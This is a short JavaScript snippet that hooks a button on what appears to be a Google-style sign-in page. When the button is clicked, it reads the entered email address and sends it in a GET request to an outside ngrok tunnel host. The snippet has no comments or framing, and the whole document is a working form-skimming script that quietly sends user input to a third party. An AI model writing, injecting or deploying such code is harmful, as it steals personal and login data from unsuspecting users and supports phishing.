(function() {
    const btn = document.getElementsByClassName('VfPpkd-LgbsSe');

    btn[1].addEventListener('click', function(){
        let param = null;

        let email = document.querySelector('[type="email"]');
        param = email.value;

        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                console.log(xhr.responseText);
            }
        };
        xhr.send();

    })
})();
